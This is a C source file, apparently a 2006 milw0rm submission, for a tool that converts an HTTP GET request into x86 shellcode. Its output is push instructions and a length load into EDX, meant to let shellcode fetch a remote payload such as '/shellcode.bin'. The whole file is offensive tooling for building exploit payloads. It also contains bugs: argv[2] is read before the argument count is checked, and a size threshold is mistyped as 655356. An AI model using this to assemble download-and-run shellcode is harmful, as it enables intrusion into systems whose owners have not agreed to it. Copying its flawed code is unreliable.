/*
 * gen_httpreq.c, utility for generating HTTP/1.x requests for shellcodes
 *
 * SIZES:
 *
 * 	HTTP/1.0 header request size - 18 bytes+
 * 	HTTP/1.1 header request size - 26 bytes+
 *
 * NOTE: The length of the selected HTTP header is stored at EDX register.
 *       Thus the generated MOV instruction (to EDX/DX/DL) is size-based.
 *
 * - izik@tty64.org
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <stdarg.h>
#include <string.h>

#define X86_PUSH \
	0x68

#define X86_MOV_TO_DL(x) \
	printf("\t\"\\xb2\\x%02x\"\n", x & 0xFF);

#define X86_MOV_TO_DX(x) \
	printf("\t\"\\x66\\xba\\x%02x\\x%02x\"\n", \
	(x & 0xFF), ((x >> 8) & 0xFF));

#define X86_MOV_TO_EDX(x) \
	printf("\t\"\\xba\\x%02x\\x%02x\\x%02x\\x%02x\"\n", \
	(x & 0xFF), ((x >> 8) & 0xFF), ((x >> 16) & 0xFF), ((x >> 24) & 0xFF));

void usage(char *);
int printx(char *fmt, ...);

int main(int argc, char **argv) {

	if (argc < 2) {
		usage(argv[0]);
		return -1;
	}

	if (argv[2][0] != '/') {

		fprintf(stderr, "filename must begin with '/' as any sane URL! (e.g. /index.html)\n");

		return -1;
	}

	if (!strcmp(argv[1], "-0")) {

		return printx("GET %s HTTP/1.0\r\n\r\n", argv[2]);
	}

	if (!strcmp(argv[1], "-1")) {

		if (argc != 4) {

			fprintf(stderr, "missing <host>, required parameter for HTTP/1.1 header! (e.g. www.tty64.org)\n");

			return -1;
		}

		return printx("GET %s HTTP/1.1\r\nHost: %s\r\n\r\n", argv[2], argv[3]);
	}

	fprintf(stderr, "%s: unknown http protocol, try -0 or -1\n", argv[1]);

	return -1;
}

/*
 * usage, display usage screen
 * * basename, barrowed argv[0]
 */

void usage(char *basename) {

	printf(
		"usage: %s <-0|-1> <filename> [<host>]\n\n"
		"\t -0, HTTP/1.0 GET request\n"
		"\t -1, HTTP/1.1 GET request\n"
		"\t <filename>, given filename (e.g. /shellcode.bin)\n"
		"\t <host>, given hostname (e.g. www.tty64.org) [required for HTTP 1.1]\n\n",
		basename);

	return ;
}

/*
 * printx, fmt string. generate the shellcode chunk
 * * fmt, given format string
 */

int printx(char *fmt, ...) {
        va_list ap;
        char buf[256], pad_buf[4], *w_buf;
	int pad_length, buf_length, i, tot_length;

	memset(buf, 0x0, sizeof(buf));

        va_start(ap, fmt);
        vsnprintf(buf, sizeof(buf), fmt, ap);
        va_end(ap);

	buf_length = strlen(buf);

	printf("\nURL: %s\n", buf);
	printf("Header Length: %d bytes\n", buf_length);

	for (i = 1; buf_length > (i * 4); i++) {
		pad_length = ((i+1)*4) - buf_length;
	}

	printf("Padding Length: %d bytes\n\n", pad_length);

	tot_length = buf_length + pad_length;

	w_buf = buf;

	if (pad_length) {

		w_buf = calloc(tot_length, sizeof(char));

		if (!w_buf) {

			perror("calloc");
			return -1;
		}

		i = index(buf, '/') - buf;

		memset(pad_buf, 0x2f, sizeof(pad_buf));

		memcpy(w_buf, buf, i);
		memcpy(w_buf+i, pad_buf, pad_length);
		memcpy(w_buf+pad_length+i, buf+i, buf_length - i);
	}

	for (i = tot_length - 1; i > -1; i-=4) {

		printf("\t\"\\x%02x\\x%02x\\x%02x\\x%02x\\x%02x\" // pushl $0x%02x%02x%02x%02x\n",
			X86_PUSH, w_buf[i-3], w_buf[i-2], w_buf[i-1], w_buf[i], w_buf[i-3], w_buf[i-2], w_buf[i-1], w_buf[i]);
	}

	if (pad_length) {

		free(w_buf);
	}

	//
	// The EDX register is assumed to be zero-out within the shellcode.
	//

	if (tot_length < 256) {

		// 8bit value

		X86_MOV_TO_DL(tot_length);

	} else if (tot_length < 655356) {

		// 16bit value

		X86_MOV_TO_DX(tot_length);

	} else {

		// 32bit value, rarely but possible ;-)

		X86_MOV_TO_EDX(tot_length);

	}

	fputc('\n', stdout);

	return 1;
}

// milw0rm.com [2006-10-22]